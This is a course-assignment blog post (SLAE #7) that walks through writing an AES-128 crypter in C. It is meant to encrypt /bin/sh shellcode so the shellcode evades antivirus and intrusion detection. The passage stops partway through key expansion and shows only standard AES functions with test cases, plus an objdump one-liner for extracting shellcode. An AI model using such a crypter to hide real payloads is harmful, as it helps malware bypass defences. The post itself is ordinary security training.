<!DOCTYPE HTML>
<!--
	Solution for SLAE question #7

-->
<html>
	<head>
		<link rel="icon" href="../images/favicon.ico">
		<title>The Post</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="../assets/css/main.css" />
		<link rel="stylesheet" href="../assets/css/atom-one-dark-reasonable.min.css">
		<script src="../assets/js/highlight.pack.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<a class="logo">The Defense</a>
					</header>

				<!-- Nav -->
					<nav id="nav">
						<ul class="links">
							<li><a href="../index.html">Home</a></li>
							<li class="active"><a href="../posts.html">Posts</a></li>
							<li><a href="../research.html">Research</a></li>
							<li><a href="../stories.html">Stories</a></li>
							<li><a href="../references.html">Links</a></li>
						</ul>
						<ul class="icons">
							<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
							<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
						</ul>
					</nav>

				<!-- Main -->
					<div id="main">
						<div class="wrapper">

						<!-- Post -->

									<!--
									Post body goes here.
									-->
                  <!--
                  Solving slae question 7
                  -->
                  <section class="post">
                    <body>
                      <article id="first-post">
												<a href="index.html"><img src="../images/gus.jpg" class="avatar" alt="avatar"> </img></a>
                        <h2>&emsp; Creating a Custom Crypter</h2>
												<h5>&emsp; &emsp; &emsp; &emsp; December 7, 2020</h5>
                        <div class="box">

													<br><h2>Contents</h2>
													<a href="#POC" style="color:blue;">Drafting the Proof of Concept</a><br>
													<a href="#Outline" style="color:blue;">System Outline</a><br>
													<a href="#Testing" style="color:blue;">Test Methodology</a><br>
													<a href="#Simple" style="color:blue;">Constructing the Simple Functions</a><br>
													<a href="#MixColumns" style="color:blue;">Mix Columns</a><br>
													<a href="#ExpandKey" style="color:blue;">Key Expansion</a><br>
													<a href="#Cipher" style="color:blue;">Cipher Repetitions</a><br>
													<a href="#Integration" style="color:blue;">Integration and Demonstration</a><br>
													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>

												<p>
														&emsp; &emsp;Good evening Tim and Aaron! &nbsp;The final post is about building a custom crypter that operates on encrypted shellcode to decrypt and
														execute it at runtime. &nbsp;This will be a challenging assignment as crypters are typically above average in size. &nbsp;Much like encoding and
														polymorphism, the purpose of encrypting shellcode is to hide it from defense mechanisms such as AntiVirus (AV) and Intrusion Detection Systems (IDSs).
														 &nbsp;A quick overview of encryption is below:<br><br>

														Encryption is a fundamental building block of computer security in which plaintext is scrambled into unreadable form using a key and sometimes
														an Initialization Vector (IV). &nbsp;Scrambling sophistication depends on an encryption scheme's algorithm. &nbsp;Some algorithms have more
														"rounds" of shifting than others. &nbsp;Symmetric encryption will be used in this post. &nbsp;In a symmetric
														algorithm, the key is shared between encryption and decryption functions.
											 	</p>
												<center><div class="image post"><img src="../images/slae/assignment7/1-encryption.png" width="700" alt="" /></div></center><br>

												<p>The above diagram depicts a symmetric encryption/decryption scheme that will be developed in this post. &nbsp;In addition to this graph, the custom
												encoding/decoding scheme from <a href="https://thestunneddefense.com/pages/custom-encoding.html" target="_blank" style="color:blue;">blog post 4</a> will be
												layered into the system. &nbsp;Finally, the payload used will be the familiar <i>execve-stack</i> shellcode used to pop a <i>/bin/sh</i> shell. &nbsp;Below
												 is the final product when everything is tied together.
												</p>
												<center><div class="image post"><img src="../images/slae/assignment7/2-crypter.png" alt="" /></div></center><br>



			<br><section id="POC"><h2>Drafting the Proof of Concept</h2></section>

											<p>
												&emsp; &emsp;Similar to <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">bind</a> and
												<a href="https://thestunneddefense.com/pages/shell-reverse-tcp.html" target="_blank" style="color:blue;">reverse</a> shells, a Proof of Concept (PoC) is
												developed using a higher level language. &nbsp;The difference this time is
												that no assembly will be coded as a result. &nbsp;This is because decryptors require many more assembly instructions
												 than decoders. &nbsp;It is simply infeasable to write a decryptor in x86 assembly when shellcode must often meet length requirements.<br>
												&emsp; &emsp;Based on the graph above, both an encryptor and decryptor need to be produced. &nbsp;They can be developed in Python or C due to their common
												handling of bytes. &nbsp;Both programs must take a key string as a parameter. &nbsp;Luckily, the decryptor will be similar to the encryptor; just
												backwards! &nbsp;Assignment constraints are below:<br>
												<li>Any existing encryption schema can be used.</li>
												<li>Any programming language can be used.</li><br>
												This is good news as developing a brand new algorithm requires significantly more time. &nbsp;Simply pick an algorithm from the list of encryption schemes
												<a href="https://en.wikipedia.org/wiki/Symmetric-key_algorithm#Implementations" target="_blank" style="color:blue;">here</a>
												and choose a langauge comfortable for developing both programs.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment7/3-algorithms.png" alt="" /></div></center><br>

											<p>
												This project will be written in C to construct an Advanced Encryption Standard (AES) crypter in 128-bit mode. &nbsp;C was selected because the crypter
											operates on bytes of data and C enables more control over 8-bit data types. &nbsp;128-bit mode was selected because it is easier to implement and has more open-source
											 test cases. &nbsp;256-bit mode could be implemented as well; however, along with fewer test cases, 256-bit mode requires key padding based on whichever
											 standard is used (ECB, CBC, CTR, etc.). &nbsp;Padding occurs to ensure the first 32 bytes of key data are filled when operating in 256-bit mode. &nbsp;This
											  is because in 256-bit mode, the first 32 bytes of the key schedule are filled with bytes from the user-provided secret key and padded to meet 32 bytes
												should the key come up short. &nbsp;In contrast, 128-bit mode only requires 16 bytes of the secret key. &nbsp;Padding standards can also be implemented in
												128 and 192 bit modes; however, it is much easier to enfore a minimum 16 character secret key! &nbsp;The next step is determining AES general
												architecture before focusing on 128-bit specific implementations.
											</p>

			<br><section id="Outline"><h2>System Outline</h2></section>

											<p>
												&emsp; &emsp;Before jumping into any code, it is important to strategically view AES using a systems engineering approach. &nbsp;What sub-methods are used,
												the data types, input and output, etc? &nbsp;The diagram below
						(<a href="https://www.amazon.com/Cryptography-Network-Security-Principles-Practice/dp/0134444280/ref=sr_1_2?dchild=1&keywords=ISBN+13%3A+978-1-292-15858-7&qid=1606786625&sr=8-2" target="_blank" style="color:blue;">source</a>, pg 178)
												illustrates a much needed breakdown of AES to determine number of functions to write. &nbsp;
											</p>
											<center><div class="image post"><img src="../images/slae/assignment7/4-aes-system.png" alt="" /></div></center><br>

											<p>
												There are ten encryption rounds (in 128-bit mode) made up of four functions in order: <i>Substitute bytes</i>, <i>Shift rows</i>, <i>Mix columns</i>, and
												<i>Add round key</i>. &nbsp;Note that <i>Mix columns</i> is omitted from the final encryption round. &nbsp;A similar removal also occurs in decryption when
												<i>Inverse mix columns</i> is omitted.<br>
												&emsp; &emsp;In addition to the above functions, AES uses a key expansion technique to transform 16 bytes of a user-supplied secret key into 44 words
												(44 words x 4 bytes = 176 total bytes) used during encryption rounds. &nbsp;The key expansion algorithm has internal functions of their own and can be observed below
					(<a href="https://www.amazon.com/Cryptography-Network-Security-Principles-Practice/dp/0134444280/ref=sr_1_2?dchild=1&keywords=ISBN+13%3A+978-1-292-15858-7&qid=1606786625&sr=8-2" target="_blank" style="color:blue;">source</a>, pg 191).
											</p>
											<center><div class="image post"><img src="../images/slae/assignment7/5-key-expansion.png" alt="" /></div></center><br>

											<p>
												The 16-byte key is saved in a 4x4 matrix with bytes grouped into words by columns, which may seem counterintuitive to naturally viewing data by rows. &nbsp;Every fourth word group
												is sent through a function called <i>g()</i> which contains subfunctions: <i>Rotate Word</i> and <i>Substitute bytes</i>. &nbsp;The result is XORed by a round constant (RC<sub>j</sub>) in
												the leftmost byte to produce a final result.


											</p>

			<br><section id="Testing"><h2>Test Methodology</h2></section>
											<p>
												&emsp; &emsp;With a general outline in place, the question becomes "where to start?" &nbsp;This much code can be overwhelming if approached haphazardly. &nbsp;An easy
												strategy is to write one function, preferably a simple one, and pass test values to observe its output. &nbsp;It also helps to know the expected output, which a simple
												function further guarantees. &nbsp;For example, starting with <i>RotWord()</i> (Rotate word) is ideal because it is small, takes fewer input, and its expected output is
												very predictable!<br>
												&emsp; &emsp;Below is an example of testing the <i>SubBytes()</i> function. &nbsp;In practice, this function will take a 16 byte state matrix as input, look up the
												sbox value of each byte, and replace that state matrix byte with its sbox lookup value. &nbsp;Check the returned state matrix by manually looking at the
												<a href="https://en.wikipedia.org/wiki/Rijndael_S-box" target="_blank" style="color:blue;">s-box value</a> for each
												byte. &nbsp;Although a bit tedious, it ensures a validated function which is critical when building the remaining program. &nbsp;Specifics of each function are covered
												later.
											</p>
											<pre>
												<code class="c-like" style=display:block;white-space:pre-wrap>
/************  SAMPLE TEST-BED FOR SINGLE FUNCTION  ************/

// Cipher transformation that processes the state using S-box substitutions
void SubBytes(uint8_t state[4][4]){

    // Execute SubBytes function per 'Ch06 Crypto7e.pdf' pg. 12
    // Each byte is an index of row x column. Ex: 0x95 = row 9, column 5
    int i, j;
    for (i = 0; i&lt;4; i++){
        for (j = 0; j&lt;4; j++){
            // for each byte need to look up sbox at specific index and assign to spot
            state[i][j] = sbox[HI_NIBBLE(state[i][j])][LO_NIBBLE(state[i][j])];
        }
    }

    // test variable state
    printf("\n\n======================================\n\n");
    printf("After S-box Substitution:\n\n");
    int row, col;
    for (row=0; row&lt;4; row++){
        for (col=0; col&lt;4; col++){
            printf("state&lsqb;%d]&lsqb;%d] = \\x%02x\n", row, col, state[row][col]);
        }
    }

    return;
}

int main(){

    // Single state value for testing
    // stored by state[row][column]; so state[0][1] = 0x23
    uint8_t state[4][4] = { {0x01, 0x23, 0x45, 0x67},
			    {0x89, 0xab, 0xcd, 0xef},
			    {0xfe, 0xdc, 0xba, 0x98},
			    {0x76, 0x54, 0x32, 0x10}
			  };

    SubBytes(state);
    return 0;
}

												</code>
											</pre>

											<p>
												The most important concept of this section is having a test setup that will ensure success. &nbsp;Test cases are incredibly important as well since they validate
												working functions. &nbsp;<a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">Encryption</a> and
												<a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" style="color:blue;">decryption</a> (page 36) test values can be found in their respective
												 links. &nbsp;The encryption link includes a test case for key expansion as well. &nbsp;For more complicated functions like <i>Inverse Mix Columns</i>, test cases can be found
												 <a href="http://www.infosecwriters.com/text_resources/pdf/AESbyExample.pdf" target="_blank" style="color:blue;">here</a> on page 8.<br>
												 &emsp; &emsp;Finally when in doubt, use print statements. &nbsp;Data visualization goes a long way when it comes to fault isolation. &nbsp;Sometimes the most difficult part of
												 debugging is figuring out the problem location and visualization helps tremendously.

											</p>

			<br><section id="Simple"><h2>Constructing the Simple Functions</h2></section>

										<p>
										&emsp; &emsp;Start coding in baby steps by constructing a word rotation function (<i>RotWord</i>) that takes four input bytes and rotates their positions
										one byte to the left. &nbsp;Note the leftmost byte, B<sub>0</sub>, wraps around to become the rightmost byte, B<sub>3</sub>. &nbsp;This is one of the sub-functions of <i>g()</i> in the
										key expansion algorithm.
										</p>
										<center><div class="image post"><img src="../images/slae/assignment7/6-rotword.png" alt="" /></div></center><br>

										<p>
										 &nbsp;It is important to note in C, individual bytes are
										handled using the <i>uint8_t</i> data type for "unsigned integer 8 bit." &nbsp;These integer types are defined in
										<a href="https://www.gnu.org/software/libc/manual/html_node/Integers.html" target="_blank" style="color:blue;"><i>stdint.h</i></a>
										so the header is required: <code>#include &lt;stdint.h></code>. &nbsp;In order for shifting to occur, the leftmost byte must be stored in a temporary location while the new positions are overwritten. &nbsp;Without
										 temporary storage, the leftmost byte will be overwritten and lost!<br>
										&emsp; &emsp;A simple outline is to declare a type uint8_t temporary variable, <i>temp</i>, and assign it the leftmost byte. &nbsp;Assign the leftmost byte position the value of
										the next byte position. &nbsp;Once the rightmost position is reached, assign it the <i>temp</i> value. &nbsp;The resultant code is below!
										</p>
											<pre>
												<code class="c-like" style=display:block;white-space:pre-wrap>
// Rotates a 4-byte word to the left by 8 bits.
// Ex: w0 = [01, 23, 45, 67] ===> w0' = [23, 45, 67, 01]
void RotWord(uint8_t wordIn[]){

    // temporarily store first byte
    uint8_t temp = wordIn[0];

    // manually shift other bytes to the left 1 position. Place temporarily
    // stored byte into last position.
    wordIn[0] = wordIn[1];
    wordIn[1] = wordIn[2];
    wordIn[2] = wordIn[3];
    wordIn[3] = temp;

    return;
}
												</code>
											</pre>

											<p>
												Give <i>RotWord()</i> a test case similar to what is done in <a href="#Testing" style="color:blue;">Test Methodology</a>; however, the test value should
												be a single array of 4 bytes. &nbsp;Add a few cosmetic print statements to help with data visualization. &nbsp;A successful test result is shown below!
											</p>
											<center><div class="image post"><img src="../images/slae/assignment7/7-rotword-demo.png" alt="" /></div></center><br>

										<p>
											Repeat the process for <i>SubBytes</i>. &nbsp;This can be written to handle either 4x4 byte matrices or 4 byte arrays; both are required in this program. &nbsp;
											Refer to its code in <a href="#Testing" style="color:blue;">Test Methodology</a> above to find a couple gaps:<br>
											<ol>
												<li>Where is the sbox array? &nbsp;</li>
												<li>Where are <code>HI_NIBBLE</code> and <code>LO_NIBBLE</code> defined?</li>
											</ol>
											 &nbsp;Refer once again to
											<a href="https://www.amazon.com/Cryptography-Network-Security-Principles-Practice/dp/0134444280/ref=sr_1_2?dchild=1&keywords=ISBN+13%3A+978-1-292-15858-7&qid=1606786625&sr=8-2" target="_blank" style="color:blue;">Cryptography and Network Security 7th Edition</a>
											 on page 181 for the substitution boxes (S-boxes). &nbsp;The left four bits is the row lookup, and the right four bits is the column. &nbsp;These lookup tables are the heart of AES
											 algorithm and rely on finite field mathematics, specifically Galois Field (GF) over 2<sup>8</sup>. &nbsp;The tables can be derived by calculating the multiplicative
											 inverse over GF(2<sup>8</sup>), which is beyond the scope of this article. &nbsp;The S-boxes can be hardcoded in their own 16 x 16 byte matrices and placed in a separate header file
											 for inclusion: <code>#include "sbox.h"</code>.
										</p>
											<center><div class="image post"><img src="../images/slae/assignment7/8-sbox.png" alt="" /></div></center><br>

										<p>
											Performing lookups on single bytes requires they be split apart. &nbsp;Performing this requires a couple definitions below. &nbsp;These definitions manipulate bit
											shifting and ANDing with 0x0F to ensure only appropriate values are returned. &nbsp;For example <code>HI_NIBBLE(0x5a)</code> equals 0x5 and <code>LO_NIBBLE(0x23)</code> equals
											 0x3. &nbsp;These definitions ensure accurate S-box lookups for each value.
										</p>
											<pre>
												<code class="c-like" style=display:block;white-space:pre-wrap>
#define HI_NIBBLE(b) (((b) >> 4) & 0x0F)
#define LO_NIBBLE(b) ((b) & 0x0F)
												</code>
											</pre>

											<p>
												Nested for-loops are used to handle individual matrix elements. &nbsp;Compile and test function <i>SubBytes()</i> and manually verify the output by inspecting the S-box.
											</p>
										<center><div class="image post"><img src="../images/slae/assignment7/9-subbytes-works.png" alt="" /></div></center><br>

										<p>
											Shift rows is another relatively easy function to write and test. &nbsp;Start with <i>RotWord()</i> and expand it to handle a 16 byte state matrix.
											 &nbsp;Below is yet another example from
											 <a href="https://www.amazon.com/Cryptography-Network-Security-Principles-Practice/dp/0134444280/ref=sr_1_2?dchild=1&keywords=ISBN+13%3A+978-1-292-15858-7&qid=1606786625&sr=8-2" target="_blank" style="color:blue;">Cryptography and Network Security 7th Edition</a>
											  of how AES row shifting works on page 186. &nbsp;The first row is unchanged, the second row shifts left by one, the third row shifts left by two, and
											  the last row shifts left by three (or right by one). &nbsp;There is an inverse shift rows function in the decryptor. &nbsp;Instead of shifting bytes left, the function shifts bytes right.
										</p>
										<center><div class="image post"><img src="../images/slae/assignment7/10-shiftrows.png" alt="" /></div></center><br>

										<p>
											Basically take <i>RotWord()</i>, change its argument, and rotate the rows by their proper offsets. &nbsp;For optimization, <i>RotWord()</i> could include
											an integer parameter to express the number of positions to shift. &nbsp;If that is done, simply call <i>RotWord()</i> three times like this:
											<i>RotWord(w1, 1)</i>; <i>RotWord(w2, 2)</i>; <i>RotWord(w3, 3)</i> and leave <i>w0</i> alone; &nbsp;Below is the final code for <i>ShiftRows()</i>.

										</p>
										<pre>
											<code class="c-like" style=display:block;white-space:pre-wrap>
// Cipher transformation that shifts last 3 rows by different offsets
void ShiftRows(uint8_t shiftedRows[4][4]){

	// Execute ShiftRows function per 'Ch06 Crypto7e.pdf' pg. 17
	int row;
	uint8_t temp, temp2;
	for (row = 0; row&lt;4; row++){
		if (row == 0) {
			// members are simply copied for first row
			shiftedRows[row][0] = shiftedRows[0][0];
			shiftedRows[row][1] = shiftedRows[0][1];
			shiftedRows[row][2] = shiftedRows[0][2];
			shiftedRows[row][3] = shiftedRows[0][3];
		}
		else if (row == 1) {
			temp = shiftedRows[row][0];
			// shift second row left 1 byte
			shiftedRows[row][0] = shiftedRows[1][1];
			shiftedRows[row][1] = shiftedRows[1][2];
			shiftedRows[row][2] = shiftedRows[1][3];
			shiftedRows[row][3] = temp;
		}
		else if (row == 2) {
			temp = shiftedRows[row][0];
			temp2 = shiftedRows[row][1];
			// shift third row left 2 bytes
			shiftedRows[row][0] = shiftedRows[2][2];
			shiftedRows[row][1] = shiftedRows[2][3];
			shiftedRows[row][2] = temp;
			shiftedRows[row][3] = temp2;
		}
		else {
			temp = shiftedRows[row][3];
			// shift fourth row left 3 bytes (or right 1 byte)
			shiftedRows[row][3] = shiftedRows[3][2];
			shiftedRows[row][2] = shiftedRows[3][1];
			shiftedRows[row][1] = shiftedRows[3][0];
			shiftedRows[row][0] = temp;
		}
	}

	return;
}
											</code>
										</pre>

										<p>
											Compile and run it with a test matrix to confirm functionality!
										</p>
										<center><div class="image post"><img src="../images/slae/assignment7/11-shiftrows-demo.png" alt="" /></div></center><br>

										<p>
											The final "easy" function is <i>Add round key</i>, which is a simple 1-to-1 XOR operation of two 16 byte matrices. &nbsp;For example in the below example,
											a<sub>2,2</sub> is XORed with b<sub>2,2</sub> and the result is stored in k<sub>2,2</sub>. &nbsp;This linear calculation happens 16 times to cover all bytes
											in the state matrix.
										</p>
										<center><div class="image post"><img src="../images/slae/assignment7/12-addroundkey.png" width="560"alt="" /></div></center><br>

										<p>
											Once again use nested for-loops to traverse all bytes of the state matrix. &nbsp;The resultant code is below.
										</p>
										<pre>
											<code class="c-like" style=display:block;white-space:pre-wrap>
// Cipher transformation in which a round key is added to the state using a XOR operation
void AddRoundKey(uint8_t state[4][4], uint8_t key[4][4]){

    // Simple 1-to-1 XOR operation
    int i, j;
    for (i = 0; i&lt;4; ++i){
        for (j = 0; j&lt;4; ++j) {
            state[i][j] ^= key[i][j];
        }
    }

    return;
}
											</code>
										</pre>

										<p>
											Compile and run the code using two test matrices. &nbsp;The
											<a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">test case</a>
											 is on page 4.
										</p>
										<center><div class="image post"><img src="../images/slae/assignment7/13-addroundkey-demo.png" alt="" /></div></center><br>







			<br><section id="MixColumns"><h2>Mix Columns</h2></section>

									<p>
										&emsp; &emsp;Covering more difficult functions begins here and includes both <i>Mix columns</i> and its inverse function. &nbsp;According to Googlepedia,
										<i>Mix columns</i> is a four byte linear transformation in a GF(2<sup>8</sup>) finite field. &nbsp;The operation treats each group of bytes as coefficients
										of a polynomial over GF(2<sup>8</sup>) and reduced by the irreducible polynomial: x<sup>8</sup> + x<sup>4</sup> + x<sup>3</sup> + x + 1. &nbsp;Because of
										that finite field property, the multiplication must check if the leftmost byte is 1 and subsequently XOR by x<sup>8</sup> + x<sup>4</sup> + x<sup>3</sup>
										 + x + 1. &nbsp;Below are the derived constant matrices for both <i>MixColumns()</i> and <i>InvMixColumns()</i> courtesy of this
										<a href="https://www.semanticscholar.org/paper/Area-Optimized-Architecture-for-AES-Mix-Column-Shaji-BonifusP./385db46392682b99e72f822cb291986fb112009d/figure/2" target="_blank" style="color:blue;">Semantic Scholar paper</a>.
										 &nbsp;These will be known as 'mixer' and 'inverse_mixer' from now on.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/14-mixcolumns-matrices.png" alt="" /></div></center><br>

									<p>
										Below is an example of matrix multiplication specific to <i>MixColumns</i> (<a href="https://www.angelfire.com/biz7/atleast/mix_columns.pdf" target="_blank" style="color:blue;">source</a>).
 									Standard matrix multiplication applies so <code>0x04 = (0x02)(0xd4) + (0x03)(0xbf) + (0x01)(0x5d) + (0x01)(0x30)</code> and <br>
									<code>0x66 = (0x01)(0xd4) + (0x02)(0xbf) + (0x03)(0x5d) + (0x01)(0x30)</code>.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/15-mixcolumns.png" width="500" alt="" /></div></center><br>

									<p>
										Since <i>MixColumns()</i> operates on a 4x4 state matrix, it must make an additional iteration over columns. &nbsp;Not only would it iterate again, the
										function must remember the original index to place the result. &nbsp;Luckily there is a freely available
										<a href="https://www.programiz.com/c-programming/examples/matrix-multiplication" target="_blank" style="color:blue;">template</a> to start with! &nbsp;The
										 template's implementation ensures sub-calculations are added to the target location each iteration. &nbsp;For example, the operation
										 (0x01)(0xd4) above is calculated and stored in the 0x04 spot before continuing with (0x02)(0xbf). &nbsp;(0x02)(0xbf) is then calculated and added
										 to the (0x01)(0xd4) result. &nbsp;Luckily the bitwise XOR and assignment operator <code>^=</code> handles this task since XOR is additive! &nbsp;Just
										 make sure the result matrix is initialized to zero beforehand.<br>
										&emsp; &emsp;Different implementations must be handled when multiplying by each number in mixer (0x01, 0x02, or 0x03). &nbsp;If the multiplied
										 number from mixer is 0x01, simply multiply it with the state matrix value and store it into its result matrix spot. &nbsp;Things get interesting when
										 multiplying by 0x02 or 0x03. &nbsp;Revisiting the finite field property, a simple bitwise left shift will mutliply a byte by two; however, it must also be XORed with
										 0x1b if the leftmost bit is 1. &nbsp;0x1b is the bitwise expression of the irreducible polynomial x<sup>8</sup> + x<sup>4</sup> + x<sup>3</sup> + x + 1 over 8 bits because
										 0x1b = 0001 1011 = (0)x<sup>7</sup> + (0)x<sup>6</sup> + (0)x<sup>5</sup> + (1)x<sup>4</sup> + (1)x<sup>3</sup> + (0)x<sup>2</sup>(1)x<sup>1</sup> + (1)x<sup>0</sup>.
										 &nbsp;Note that (1)x<sup>8</sup> is cut out because the finite field is over 8 bits.
										 &nbsp;All of this can be handled using if-statements and checking for a high nibble greater than 0x8. &nbsp;Perform the same check when 0x03 is
										  multiplied. &nbsp;The only addition is XORing the result with the state value one more time to get a multiplication of 0x03. &nbsp;Below is the resultant code.


									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
uint8_t mixer[4][4] = { {0x02, 0x03, 0x01, 0x01},
			{0x01, 0x02, 0x03, 0x01},
			{0x01, 0x01, 0x02, 0x03},
			{0x03, 0x01, 0x01, 0x02}
		      };

// Cipher transformation that takes all of the columns of the state and mixes their data to produce new columns
void MixColumns(uint8_t state[4][4]){
    // Execute MixColumns function per source: `angelfire.com/biz7/atleast/mix_columns.pdf`
    // character '<<' means left shift by x bits
    int i, j, k;
    uint8_t result[4][4] = { 0 };
    for (i = 0; i&lt;4; ++i){
        for (j = 0; j&lt;4; ++j) {
            for (k = 0; k&lt;4; ++k){
                // Iterate over COLUMNS in state, while iterating by Mixer ROWS on the outside loop
                // hence mixer[i][k] and state[k][j]
                if (mixer[i][k] == 0x01){
                    // Do normal multiplication (0x01 * column value)
                    result[i][j] ^= mixer[i][k]*state[k][j];
                }
                else if (mixer[i][k] == 0x02){
                    // slightly more complicated instructions
                    // left shift state[i][j] value 1 byte then XOR with 0x1b if leftmost bit is 1
                    // source: `cs.purdue.edu/homes/ssw/cs655/rij.pdf`
                    if (HI_NIBBLE(state[k][j]) >= 8){
                        result[i][j] ^= (state[k][j] &lt;&lt;1) ^ 0x1b;
                    }
                    else {
                        result[i][j] ^= (state[k][j] &lt;&lt; 1);
                    }
                }
                else {
                    // Same instructions as mixer[j][i] == 0x02 with an additional XOR of state[k][j]
                    if (HI_NIBBLE(state[k][j]) >= 8){
                        result[i][j] ^= (state[k][j] &lt;&lt;1) ^ 0x1b;
                    }
                    else {
                        result[i][j] ^= (state[k][j] &lt;&lt; 1);
                    }
                    result[i][j] ^= state[k][j];
                } // end else
            } // end k
        } // end j
    } // end i

    // Store all results back into state matrix
    int row, col;
    for (row=0; row&lt;4; row++){
        for (col=0; col&lt;4; col++){
            state[row][col] = result[row][col];
        }
    }

    return;
}
										</code>
									</pre>

									<p>
									Compile and validate the function using <a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">this</a> test
									case on page 7.
								</p>

									<center><div class="image post"><img src="../images/slae/assignment7/16-mixcolumns-demo.png" alt="" /></div></center><br>

									<p>
										Inverse Mix columns operates the same way although a small challenge is presented: the numbers to multiply are much larger
										(0x09, 0x0b, 0x0d, and 0x0e). &nbsp;Luckily
										<a href="http://www.infosecwriters.com/text_resources/pdf/AESbyExample.pdf" target="_blank" style="color:blue;">InfosecWriters</a> published
										a couple tables on page 8 to help multiply over finite fields. &nbsp;These lookup tables similar to the S-boxes above. &nbsp;For each value being multiplied,
										perform an L[][] lookup on them then add together. &nbsp;Once added together, perform an E[][] lookup on the result and <code>^=</code> it to the target
										position. &nbsp;Iterate over the matrix indeces the same way in <i>MixColumns()</i>. &nbsp;If an encrypted byte passed into L[][] is 0x00, then it is
										equivalent to multiplying by 0. &nbsp;Simply XOR the result with 0x00. &nbsp;Below is the final code.
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
uint8_t inverse_mixer[4][4] = { {0x0e, 0x0b, 0x0d, 0x09},
				{0x09, 0x0e, 0x0b, 0x0d},
				{0x0d, 0x09, 0x0e, 0x0b},
				{0x0b, 0x0d, 0x09, 0x0e}
			      };

// Cipher transformation that takes all of the columns of the state and mixes their data to produce new columns
void InvMixColumns(uint8_t state[4][4]){

    // Execute Inverse MixColumns function: `http://infosecwriters.com/text_resources/pdf/AESbyExample.pdf` pgs. 8-9
    int i, j, k;
    uint8_t result[4][4] = { 0 };
    uint8_t L_state, L_invmixer, byte;

    for (i = 0; i&lt;4; ++i){
        for (j = 0; j&lt;4; ++j) {
            for (k = 0; k&lt;4; ++k) {
                /* Iterate over COLUMNS in state, while iterating by inverse_mixer ROWS on the outside loop
                hence inverse_mixer[i][k] and state[k][j]
                Matrix multiplication is more complicated in inverse MixColumns.  That is why lookup tables
                E and L are used to represent Galois Field finite field multiplication
                */

                // Handle multiplication instance for a null byte in state[k][j]; There are no NULL bytes in inverse_mixer
                if (state[k][j] == 0x00){
                    result[i][j] ^= 0x00;
                }
                else {

                    // First stage results from L lookup table over GF2
                    L_state = L[HI_NIBBLE(state[k][j])][LO_NIBBLE(state[k][j])];
                    L_invmixer = L[HI_NIBBLE(inverse_mixer[i][k])][LO_NIBBLE(inverse_mixer[i][k])];

                    // Check if byte overflow occurs when summing L_state and L_invmixer. Subtract 0xff if overflow occurs.
                    if (L_state + L_invmixer > 0xff) {
                        byte = L_state + L_invmixer - 0xff;
                    }
                    else {
                        // else do normal byte addition
                        byte = L_state + L_invmixer;
                    }

                    // Add E-lookup result into temporary state matrix
                    result[i][j] ^= E[HI_NIBBLE(byte)][LO_NIBBLE(byte)];

                } // end normal else statement

            } // end k
        } // end j
    } // end i

    // Store all results back into state matrix
    int row, col;
    for (row=0; row&lt;4; row++){
        for (col=0; col&lt;4; col++){
            state[row][col] = result[row][col];
        }
    }

    return;
}

										</code>
									</pre>

									<p>
										Use the highlighted test values below from <a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" style="color:blue;">NIST FIPS 197</a>
										page 37 as the input state matrix.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/17-invmixcolumns-test.png" alt="" /></div></center><br>

									<p>
										Compile and run to verify the output matches the start of round 2 values above.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/18-invmixcolumns-demo.png" alt="" /></div></center><br>



			<br><section id="ExpandKey"><h2>Key Expansion</h2></section>
			<!--
			OBJDUMP Special Command:
			objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
			-->
									<p>
										&emsp; &emsp;Key expansion consists of using the earlier "easy" functions as building blocks; however, these functions are only used on every
										fourth word. &nbsp;More logic must be built out in key expansion to handle the other words. &nbsp;Below is the algorithm from the most reliable source,
										<a href="https://www.amazon.com/Cryptography-Network-Security-Principles-Practice/dp/0134444280/ref=sr_1_2?dchild=1&keywords=ISBN+13%3A+978-1-292-15858-7&qid=1606786625&sr=8-2" target="_blank" style="color:blue;">Cryptography and Network Security 7th Edition</a>
										 from page 191.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/19-keyexpansion-algorithm.png" alt="" /></div></center><br>

									<p>
									Because this is AES-128 mode, the first four words of the key are simply the first 16 bytes of the user provided key. &nbsp;This assignment is easy
									and is handled with a simple XOR operation looping over the words. &nbsp;Words 4 to 44 require an XOR of the previous word and its [i - 4] indexed
									word. &nbsp;Because of the special function implemented every fourth word, the previous word must be stored in a temporary word regardless.
									 &nbsp;Checking every fourth word is handled by a modulo operation in an if-statement allowing the program to branch to the <i>g()</i> function.
